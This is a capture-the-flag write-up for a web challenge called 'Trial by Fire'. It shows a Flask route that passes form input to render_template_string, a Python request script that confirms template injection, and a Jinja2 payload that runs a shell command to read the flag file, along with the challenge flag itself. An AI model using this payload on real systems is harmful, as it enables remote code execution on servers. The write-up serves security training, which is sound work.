# Trial by Fire

## Synopsis

Trial by Fire is a very easy web challenge. Players will utlise SSTI to gain RCE.

### Skills Required

* Knowledge of Python
* Knowledge of Jinja2

### Skills Learned

* Performing Server-Side Template Injection

## Solution

When we visit the site, we're greeted with a form that accepts the "warrior's" name.

<figure><img src="../../../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

Then we are greeted with a turn-based game. We can perform attacks and the dragon responds.

<figure><img src="../../../../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

After the game ends, we have a statistics page showed.

<figure><img src="../../../../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

Looking at the source code, we find out that the `battle-report` is passing user input to the `render_template_string()` function, which is a clear indicator that the application is vulnerable to SSTI

```python
@web.route('/battle-report', methods=['POST'])
def battle_report():
    stats = {
        . . .
        'damage_dealt': request.form.get('damage_dealt', "0"),
        'turns_survived': request.form.get('turns_survived', "0")
        . . .
    }

    REPORT_TEMPLATE = f"""
        . . .
        <p class="title">Battle Statistics</p>
        <p>🗡️ Damage Dealt: <span class="nes-text is-success">{stats['damage_dealt']}</span></p>
        . . .
        <p>⏱️ Turns Survived: <span class="nes-text is-primary">{stats['turns_survived']}</span></p>
        . . .
    """

    return render_template_string(REPORT_TEMPLATE)
```

We can confirm the SSTI by running a payload like `{{ 7 * 7 }}`.

```python
import requests

BASE_URL = "http://127.0.0.1:1337"

payload = "{{ 7 * 7 }}"

response = requests.post(f"{BASE_URL}/battle-report", data={
    "damage_dealt": payload
})

print(response.text) # <p>🗡️ Damage Dealt: <span class="nes-text is-success">49</span></p>
```

Now using the payload below we can get system command execution from SSTI, and we get the flag!

```python
{{ url_for.__globals__.sys.modules.os.popen('cat flag.txt').read() }}
```

#### Flag

* `HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght}`
